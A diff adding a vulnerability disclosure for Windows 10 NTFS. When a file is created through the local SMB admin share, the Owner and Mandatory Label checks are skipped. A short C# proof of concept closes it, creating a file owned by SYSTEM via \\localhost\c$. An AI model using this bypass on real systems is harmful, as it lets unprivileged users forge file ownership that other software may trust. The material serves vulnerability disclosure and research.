@@ -1,0 +1,77 @@
+/*
+Windows: NTFS Owner/Mandatory Label Privilege Bypass EoP
+Platform: Windows 10 1709 not tested 8.1 Update 2 or Windows 7
+Class: Elevation of Privilege
+
+Summary:
+When creating a new file on an NTFS drive it’s possible to circumvent security checks for setting an arbitrary owner and mandatory label leading to a non-admin user setting those parts of the security descriptor with non-standard values which could result in further attacks resulting EoP.
+
+Description:
+
+The kernel limits who can arbitrarily set the Owner and Mandatory Label fields of a security descriptor. Specifically unless the current token has SeRestorePrivilege, SeTakeOwnershipPrivilege or SeRelabelPrivilege you can only set an owner which is set in the current token (for the label is can also be less than the current label). As setting an arbitrary owner in the token or raising the IL is also a privileged operation this prevents a normal user from setting these fields to arbitrary values.
+
+When creating a new file on an NTFS volume you can specify an arbitrary Security Descriptor with the create request and it will be set during the creation process. If you specify an arbitrary owner or label it will return an error as expected. Looking at the implementation in NTFS the function NtfsCreateNewFile calls NtfsAssignSecurity which then calls the kernel API SeAssignSecurityEx. The problem here is that SeAssignSecurityEx doesn’t take an explicit KPROCESSOR_MODE argument so instead the kernel takes the current thread’s previous access mode. The previous mode however might not match up with the current assumed access mode based on the caller, for example if the create call has been delegated to a system thread.
+
+A common place this mode mismatch occurs is in the SMB server, which runs entirely in the system process. All threads used by SMB are running with a previous mode of KernelMode, but will create files by specifying IO_FORCE_ACCESS_CHECK so that the impersonated caller identity is used for security checks. However if you specify a security descriptor to set during file creation the SMB server will call into NTFS ending up in SeAssignSecurityEx which then thinks it’s been called from KernelMode and bypasses the Owner/Label checks.
+
+Is this useful? Almost certainly there’s some applications out there which use the Owner or Label as an indicator that only an administrator could have created the file (even if that’s not a very good security check). For example VirtualBox uses it as part of its security checks for whether a DLL is allowed to be loaded in process (see my blog about it https://googleprojectzero.blogspot.com.au/2017/08/bypassing-virtualbox-process-hardening.html) so I could imagine other examples including Microsoft products. Another example is process creation where the kernel checks the file's label to determine if it needs to drop the IL on the new process, I don't think you can increase the IL but maybe there's a way of doing so.
+
+Based on the implementation this looks like it would also bypass the checks for setting the SACL, however due to the requirement for an explicit access right this is blocked earlier in the call through the SMBv2 client. I’ve not checked if using an alternative SMBv2 client implementation such as SAMBA would allow you to bypass this restriction or whether it’s still blocked in the server code.
+
+It’s hard to pin down which component is really at fault here. It could be argued that SeAssignSecurityEx should take a KPROCESSOR_MODE parameter to determine the security checks rather than using the thread’s previous mode. Then again perhaps NTFS needs to do some pre-checking of it’s own? And of course this wouldn’t be an issue if the SMB server driver didn’t run in a system thread. Note this doesn’t bypass changing the Owner/Label of an existing file, it’s only an issue when creating a new file.
+
+Proof of Concept:
+
+I’ve provided a PoC as a C# source code file. You need to compile it first. It will attempt to create two files with a Security Descriptor with the Owner set to SYSTEM. 
+
+1) Compile the C# source code file.
+2) Execute the PoC as a normal user or at least a filtered split-token admin user.
+
+Expected Result:
+Both file creations should fail with the same error when setting the owner ID.
+
+Observed Result:
+The first file which is created directly fails with an error setting the owner ID. The second file which is created via the C$ admin share on the local SMB server succeeds and if the SD is checked the owner is indeed set to SYSTEM.
+*/
+
+using System;
+using System.IO;
+using System.Security.AccessControl;
+
+namespace NtfsSetOwner_EoP
+{
+    class Program
+    {
+        static void CreateFileWithOwner(string path)
+        {
+            try
+            {
+                FileSecurity sd = new FileSecurity();
+                sd.SetSecurityDescriptorSddlForm("O:SYG:SYD:(A;;GA;;;WD)");
+                using (var file = File.Create(path, 1024, FileOptions.None, sd))
+                {
+                    Console.WriteLine("Created file {0}", path);
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error creating file {0} with arbitrary owner", path);
+                Console.WriteLine(ex.Message);
+            }
+        }
+
+        static void Main(string[] args)
+        {
+            try
+            {
+                Directory.CreateDirectory(@"c:\test");
+                CreateFileWithOwner(@"c:\test\test1.txt");
+                CreateFileWithOwner(@"\\localhost\c$\test\test2.txt");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex);
+            }
+        }
+    }
+}
